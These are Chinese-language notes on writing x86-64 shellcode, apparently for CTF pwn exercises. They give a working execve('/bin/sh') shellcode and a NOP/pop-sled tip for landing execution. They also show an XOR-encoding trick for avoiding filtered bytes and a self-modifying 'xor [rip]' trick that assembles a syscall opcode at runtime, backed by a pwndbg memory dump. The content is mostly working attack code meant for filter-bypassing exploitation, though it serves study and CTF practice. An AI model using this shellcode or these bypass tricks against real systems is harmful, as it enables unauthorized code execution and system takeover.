使用 push,pop完成操作占用空间更小, mov 0x3b: `48c7c03b000000`, push pop: `6a3b58`

```sh
mov rax, 0x68732f6e69622f	/* /bin/sh\x00 */
push rax
push rsp
pop rdi			/* rdi -> /bin/sh */
xor esi, esi	/* rsi = 0 */
xor edx, edx	/* rdx = 0 */
push 0x3b
pop rax
syscall
```
## 执行到指定位置可以使用 pop rsi 这种滑板 或者 nop 滑板

## 绕过


```sh
# 把 0x6873 放到栈上
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
```
## 但是直接push一个值到栈上要注意：

push 只能push一个32位数，超过32位不能编译（起码用pwntools的asm是这样子）

push 超过一个字节的数，会自动补全成32位，比如push 0x6873，就会编译为 hsh\x00\x00

但是如果只是push一个字节，就会编译为2个字节，比如push 0x8，机器码为 j\x08

## 使用 xor rip 的方式不错

```sh
    xor rax,rax
    mov esi,0x20230000
    xor dword ptr [rip],0x9f
    nop

```

```sh
*RIP  0x20230008 ◂— xor dword ptr [rip], 0x9f /* 0x9f000000003581 */
pwndbg> x/32bx  0x20230008                
0x20230008:     0x81    0x35    0x00    0x00    0x00    0x00    0x9f    0x00   
0x20230010:     0x00    0x00    0x90    0x05    0x00    0x00    0x00    0x00   
-- xor dword ptr [rip] -- 0x9f8135000000009f000000, rip指向的是下一条 0x90, 0x90 ^ 0x9f = 0xf 构成 0f05 - syscall
```